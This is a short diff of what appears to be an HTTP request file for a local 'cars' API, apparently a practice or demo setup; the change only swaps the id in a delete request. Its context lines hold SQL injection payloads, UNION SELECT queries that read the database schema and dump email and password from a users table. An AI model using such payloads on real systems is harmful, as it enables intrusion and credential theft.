@@ -103,7 +103,7 @@ get http://localhost:3000/cars/1 union select column_name, '', '', data_type fro
 get http://localhost:3000/cars/1 union select email, password, '','' from users
 
 ### delte car by id
-delete http://localhost:3000/cars/2
+delete http://localhost:3000/cars/1
 
 ### post car
 post http://localhost:3000/cars
